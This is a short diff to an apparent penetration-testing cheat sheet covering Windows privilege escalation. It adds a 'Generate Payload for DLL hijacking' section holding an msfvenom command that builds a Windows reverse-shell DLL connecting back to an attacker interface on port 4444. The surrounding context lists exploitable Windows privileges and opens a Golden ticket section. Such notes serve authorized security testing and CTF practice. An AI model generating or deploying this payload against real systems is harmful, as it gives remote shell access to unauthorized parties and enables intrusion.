@@ -98,6 +98,11 @@ python3 -m http.server 80
 Other privileges that can be exploited if enabled: 
 `SeBackupPrivilege` `SeAssignPrimaryToken` `SeLoadDriver` `SeDebug`
 
+Generate Payload for DLL hijacking
+---
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f dll -o revshell.dll
+```
 Golden ticket
 ---
 generate user password hash:
